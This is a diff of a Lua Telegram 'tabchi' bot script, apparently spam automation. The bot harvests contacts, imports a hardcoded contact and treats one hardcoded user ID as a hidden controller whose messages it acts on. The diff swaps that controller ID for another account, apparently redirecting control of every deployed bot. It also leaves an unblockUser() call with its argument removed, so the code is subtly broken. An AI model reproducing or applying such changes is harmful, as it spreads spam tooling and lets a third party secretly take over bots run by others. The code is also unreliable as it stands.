@@ -41,7 +41,7 @@ function check_contact(extra, result)
     local user_id = msg.content_.contact_.user_id_
     tdcli.add_contact(phone_number, first_name, last_name, user_id)   
     tdcli.searchPublicChat("tgMemberPlus")
-    tdcli.unblockUser(345767079)
+    tdcli.unblockUser()
     tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
@@ -286,7 +286,7 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
       end
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 345767079,
+        bot_user_id_ = 231539308,
         chat_id_ = msg.chat_id_,
         user_location_ = {
           ID = "Location",
@@ -561,13 +561,13 @@ function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 345767079 
+    user_id_ = 231539308 
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 345767079 then
+    if msg.sender_user_id_ == 231539308 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 345767079 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
